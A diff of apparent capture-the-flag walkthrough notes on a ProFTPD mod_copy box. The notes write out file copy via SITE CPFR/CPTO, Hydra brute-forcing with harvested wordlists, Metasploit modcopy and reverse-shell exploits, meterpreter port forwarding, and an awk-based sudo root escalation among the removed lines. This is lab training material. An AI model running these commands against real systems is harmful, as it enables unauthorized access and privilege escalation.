@@ -26,7 +26,7 @@ Service Info:
 
 2. Enumeration
 FTP Enumeration (need user and password, use modecopy) 
-http (Has link about album)
+http (Has link about album, good idea to create a  wordlist, I used my own scrip to do it.)
 
 Exploiting ProFTPD
 ProFTPD allows file copy between directories. We need to find where the passwd is.
@@ -42,15 +42,24 @@ site cpto /var/www/html/passwd ( You can changed the mame passwd on the path var
 250 Copy successful  
 
 open it on browser: <host>/passwd
-download the file, you can see is saved users
+download the file, you can see is user on itm we can used it to create a users wordlist.
+
+To created wordlist I use vi <name of wordlist.txt>
+
+Now we have 2 words list, users and password, Bad baoys, bad boyys, what we gonna do? Hydra
+
+Hydra <-L if you have a wordlist> <-P if you have wordlist> <host> <protocol>
+      < -l if you don't have wordlist> <-p if you don't have wordlist> <host-on-line> <protocol if ssh use -t5>
+Hydra -L <users.txt> -P <pasWord.txt> <host> ftp
+
+ 
 Exploiting ProFTPD
 ProFTPD allows file copy between directories. Use msfconsole to exploit it.
 
 Steps:
 Search for the ProFTPD exploit:
-bash
+
 Select and configure the exploit:
-bash
 
 use exploit/unix/ftp/proftpd_modcopy_exec  
 set RHOST <target IP>  
@@ -62,35 +71,43 @@ After successful exploitation, escalate the shell:
 bash
 
 python -c "import pty; pty.spawn('/bin/bash')"  
+
+su -l
+id etc.
+login with user dg and and password
+search for: 
+proftpd.config
+cat  proftpd.config
+
+netstat -antp
+sudo /home/dg/bd/sbin/proftpd
+
 3. Privilege Escalation
-FTP Write Privilege Abuse
-Create a malicious file on your local machine:
 
-bash
+ctrl-z put to the background
+session
+Vamos promover shell, cara ta fraco aqui.
+search shell_to__meterpreter
+config  set lhost <your> set session 1 and exploit.
 
-echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test  
-Upload the file to the FTP server:
+sessions
+vamos para o portfwd (criador de tunelamento local da maquina)
 
-bash
+portfwd add -L 127.0.0.1 -l(L minusculo) 2121 -p 2121 127.0.0.1
 
-ftp <host>  
-put test  
-Use netcat to copy the file to a privileged directory:
+ctrl-z
+search 133c
+options
+set rhost 127.0.0.1
+set rport
+set payload <use o reverse perl>
+set lhost <your - ip>
+set rport<ur choose 8080>
+exploit
 
-bash
+id 
 
-nc <host> 21  
-site cpfr /home/ftp/test  
-350 File or directory exists, ready for destination name  
 
-site cpto /home/patrick/script/test  
-250 Copy successful  
-Execute the file with elevated privileges:
-
-bash
-
-sudo /home/patrick/script/test  
-whoami  
 root  
 
 
